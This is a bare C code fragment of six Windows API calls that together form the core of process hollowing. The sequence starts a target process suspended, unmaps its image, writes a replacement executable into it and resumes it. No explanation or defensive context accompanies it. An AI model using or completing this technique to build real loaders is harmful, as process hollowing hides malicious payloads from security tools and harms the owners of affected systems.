CreateProcessA(target, 0, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi);
NtUnmapViewOfSection(pi.hProcess, base);
VirtualAllocEx(pi.hProcess, base, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, base, image, size, 0);
SetThreadContext(pi.hThread, &ctx);
ResumeThread(pi.hThread);
